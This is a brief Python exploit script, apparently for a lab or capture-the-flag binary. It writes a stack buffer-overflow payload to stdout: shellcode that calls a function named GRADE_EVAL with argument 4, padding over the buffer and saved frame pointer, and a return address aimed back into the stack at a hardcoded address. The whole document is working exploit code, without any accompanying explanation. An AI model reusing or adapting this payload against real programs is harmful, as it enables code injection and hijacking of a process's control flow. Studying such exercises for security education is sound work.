#!/usr/bin/env python3
import sys

GRADE_EVAL = 0x401A87
BUF_ADDR   = 0x721000800FD0

sc  = b"\xbf\x04\x00\x00\x00"
sc += b"\xb8" + GRADE_EVAL.to_bytes(4, "little")
sc += b"\xff\xd0"

payload  = sc + b"A" * (16 - len(sc))
payload += b"B" * 8
payload += BUF_ADDR.to_bytes(8, "little")
sys.stdout.buffer.write(payload + b"\n")